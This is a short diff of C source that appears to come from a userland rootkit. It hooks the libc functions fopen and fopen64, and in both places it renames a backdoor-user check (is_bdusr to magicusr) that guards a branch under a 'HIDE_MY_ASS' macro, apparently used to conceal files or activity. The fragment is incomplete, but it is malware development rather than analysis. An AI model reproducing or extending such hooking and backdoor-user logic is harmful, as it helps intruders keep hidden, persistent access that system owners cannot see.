@@ -1,6 +1,6 @@
 FILE *fopen(const char *pathname, const char *mode){
     hook(CFOPEN);
-    if(is_bdusr()){
+    if(magicusr()){
 #ifdef HIDE_MY_ASS
         FILE *ret = call(CFOPEN, pathname, mode);
         if(ret){
@@ -60,7 +60,7 @@ FILE *fopen(const char *pathname, const char *mode){
 
 FILE *fopen64(const char *pathname, const char *mode){
     hook(CFOPEN64);
-    if(is_bdusr()){
+    if(magicusr()){
 #ifdef HIDE_MY_ASS
         FILE *ret = call(CFOPEN64, pathname, mode);
         if(ret){
